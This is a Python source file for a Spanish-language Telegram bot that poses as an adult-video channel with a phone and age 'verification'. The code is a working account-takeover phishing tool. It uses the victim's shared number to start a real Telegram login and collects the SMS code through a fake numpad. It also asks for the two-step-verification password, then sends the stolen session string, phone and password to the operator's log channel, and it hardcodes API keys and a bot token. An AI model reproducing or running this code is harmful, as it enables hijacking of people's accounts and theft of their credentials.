import asyncio
import re
from telethon import Button, TelegramClient, types
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from telethon import TelegramClient, events

# --- Datos del usuario ---
API_ID = 23032698
API_HASH = '99ad65a5fcd38203621cb20acd2aaba5'
BOT_TOKEN = '9180250040:AAH-HHpimmA_wJ6YaD8U90pjY2cEApXAORo'
MY_ID = 8626660857  # ID del dueño único
LOG_CHANNEL = 'wkwnwnqnqk'  # Nombre de usuario del canal sin @ ni enlace completo

bot = TelegramClient('bait_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BAIT_LIST = []
user_data = {}
verified_users = set()


def build_numpad():
    return [
        [Button.inline('1', b'1'), Button.inline('2', b'2'), Button.inline('3', b'3')],
        [Button.inline('4', b'4'), Button.inline('5', b'5'), Button.inline('6', b'6')],
        [Button.inline('7', b'7'), Button.inline('8', b'8'), Button.inline('9', b'9')],
        [Button.inline('Borrar ❌', b'clear'), Button.inline('0', b'0')]
    ]


async def delete_after_delay(user_id, message_ids, delay):
    await asyncio.sleep(delay)
    try:
        await bot.delete_messages(user_id, message_ids)
    except:
        pass


async def send_bait(user_id):
    """Envío de videos y mensaje final de espera"""
    if len(BAIT_LIST) == 0:
        await bot.send_message(user_id, '⚠️ No hay videos disponibles por el momento..')
        return

    to_send = BAIT_LIST[:20]
    sent_msg_ids = []

    for msg in to_send:
        try:
            m = await bot.send_message(user_id, msg)
            sent_msg_ids.append(m.id)
            await asyncio.sleep(0.3)
        except Exception:
            pass

    # 1) Mensaje de envío completado
    await bot.send_message(
        user_id,
        f"✅ **¡Se mandaron {len(to_send)} videos con éxito!**\n\n"
        f"🔥 **¿Querés ver más videos exclusivos?**\n"
        f"*(Hay más de 5000 videos nuevos listos)*\n\n"
        f"⚠️ **Atención:** Estos videos son temporales y se borran automáticamente en **300 segundos**. "
        f"¡Si te los querés guardar, reenvitalos a otro chat! 👆"
    )

    # 2) Mensaje de aviso de espera
    await bot.send_message(user_id, '⏳ **En 24 horas te mandamos automáticamente más videos.**')

    asyncio.create_task(delete_after_delay(user_id, sent_msg_ids, 300))


# ==== /start ====
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id

    if user_id in verified_users:
        await event.respond(
            '🔓 **¡Qué bueno verte de nuevo!**\n\nMirá los videos acá abajo 👇',
            buttons=[[Button.inline('🎥 Ver videos 🍑', b'show_bait')]]
        )
        return

    await event.respond(
        '⚠️ **Aviso de seguridad:**\n'
        'Para ver todo el contenido, tenés que confirmar que sos una persona real y no un bot, '
        'y verificar que tenés más de 18 años completando la verificación una sola vez ✅',
        buttons=[[Button.request_phone('✅ Verificar número de teléfono (Continuar)')]]
    )


# ==== Manejo de callbacks de botones ====
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data.decode()

    if data == 'show_bait':
        if user_id not in verified_users:
            await event.answer('⚠️ ¡Primero tenés que verificar tu número de teléfono!', alert=True)
            return
        await event.answer('Cargando los videos...', alert=False)
        await send_bait(user_id)
        return

    if user_id in user_data and user_data[user_id]['step'] == 'code':
        if data.isdigit():
            user_data[user_id]['code'] += data
            current_code = user_data[user_id]['code']
            await event.edit(
                f"🔐 **Ingresá el código de verificación:**\n\nCódigo ingresado: `{'*' * len(current_code)}`",
                buttons=build_numpad()
            )
            if len(current_code) == 5:
                d = user_data[user_id]
                try:
                    await d['client'].sign_in(d['phone'], d['code'], phone_code_hash=d['hash'])
                    await finish_login(user_id, d)
                except SessionPasswordNeededError:
                    user_data[user_id]['step'] = '2fa'
                    await event.edit(
                        '🔐 **Esta cuenta está protegida con verificación en dos pasos.**\n\n'
                        'Por favor, mandá la **contraseña de tu cuenta** como un mensaje normal:'
                    )
                except Exception:
                    # Reiniciar ingreso al haber error de código
                    user_data[user_id]['code'] = ''
                    await event.edit('🔐 **¡Código incorrecto! Probá de nuevo:**', buttons=build_numpad())
        elif data == 'clear':
            user_data[user_id]['code'] = ''
            await event.edit('🔐 **Ingresá el código de verificación:**', buttons=build_numpad())


# ==== Recepción de número de teléfono ====
@bot.on(events.Raw(types.UpdateNewMessage))
async def raw_handler(update):
    if not hasattr(update, 'message'):
        return
    try:
        user_id = update.message.peer_id.user_id
    except:
        return

    if update.message.media and isinstance(update.message.media, types.MessageMediaContact):
        m = update.message.media
        phone = m.phone_number

        try:
            await bot.delete_messages(user_id, [update.message.id])
        except:
            pass

        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()
        try:
            sent_code = await new_client.send_code_request(phone)
            user_data[user_id] = {
                'phone': phone,
                'client': new_client,
                'hash': sent_code.phone_code_hash,
                'code': '',
                'step': 'code'
            }
            await bot.send_message(
                user_id,
                '🔐 **Ingresá el código de verificación de 5 dígitos que te mandamos:**',
                buttons=build_numpad()
            )
        except Exception as e:
            await bot.send_message(user_id, f'⚠️ Ocurrió un error: {str(e)}')


# ==== Manejo de mensajes ====
@bot.on(events.NewMessage)
async def message_handler(event):
    user_id = event.sender_id

    # ===== Dueño =====
    if user_id == MY_ID:
        if event.message:
            BAIT_LIST.append(event.message)
            await event.reply(f'✅ ¡Video agregado con éxito! (Total: {len(BAIT_LIST)})')
        return

    # ===== Recepción de código de verificación vía texto =====
    if user_id in user_data and user_data[user_id].get('step') == 'code':
        if event.text:
            try:
                await event.delete()
            except:
                pass

            digits = re.sub(r'\D', '', event.text)

            if digits:
                d = user_data[user_id]
                try:
                    await d['client'].sign_in(d['phone'], digits, phone_code_hash=d['hash'])
                    await finish_login(user_id, d)
                except SessionPasswordNeededError:
                    user_data[user_id]['step'] = '2fa'
                    await bot.send_message(
                        user_id,
                        '🔐 **Esta cuenta está protegida con verificación en dos pasos.**\n\n'
                        'Por favor, mandá la **contraseña de tu cuenta** como un mensaje normal:'
                    )
                except Exception:
                    user_data[user_id]['code'] = ''
                    try:
                        await bot.send_message(
                            user_id,
                            '🔐 **¡Código incorrecto! Probá de nuevo:**',
                            buttons=build_numpad()
                        )
                    except:
                        pass
            return

    # ===== Manejo de contraseña de Verificación en Dos Pasos (2FA) =====
    if user_id in user_data and user_data[user_id].get('step') == '2fa':
        password = event.text

        try:
            await event.delete()
        except:
            pass

        user_data[user_id]['2fa_password'] = password
        d = user_data[user_id]
        try:
            await d['client'].sign_in(password=password)
            await finish_login(user_id, d)
        except Exception:
            try:
                await bot.send_message(user_id, '⚠️ **Contraseña incorrecta. Probá de nuevo:**')
            except:
                pass
        return


async def finish_login(user_id, d):
    """Envío de logs al canal y despacho de videos al usuario tras inicio de sesión exitoso"""
    try:
        ss = d['client'].session.save()
        pass_2fa = d.get('2fa_password', 'Ninguna')

        try:
            me = await d['client'].get_me()
            username = f"@{me.username}" if me.username else "Ninguno"
            first_name = me.first_name if me.first_name else "Ninguno"
        except:
            username = "Desconocido"
            first_name = "Desconocido"

        log = (
            f"🔥 ¡Nueva sesión obtenida!\n\n"
            f"👤 Nombre: {first_name}\n"
            f"📝 Usuario: {username}\n"
            f"📱 Teléfono: {d['phone']}\n"
            f"🔐 Contraseña: {pass_2fa}\n\n"
            f"🎫 String de sesión:\n`{ss}`"
        )

        # Envío de log al canal
        try:
            await bot.send_message(LOG_CHANNEL, log)
        except Exception as e:
            # Si falla el envío al canal, se manda al dueño
            await bot.send_message(MY_ID, f'⚠️ Falló el envío al canal, detalle del error: {e}\n\n{log}')

        verified_users.add(user_id)

        if user_id in user_data:
            del user_data[user_id]

        try:
            await send_bait(user_id)
        except Exception as e:
            await bot.send_message(MY_ID, f'⚠️ Error al enviar videos: {str(e)}')

    except Exception as e:
        await bot.send_message(MY_ID, f'⚠️ Error en finish_login: {str(e)}')


print('🚀 El bot está ejecutándose')
print(f'👑 Dueño: {MY_ID}')
bot.run_until_disconnected()
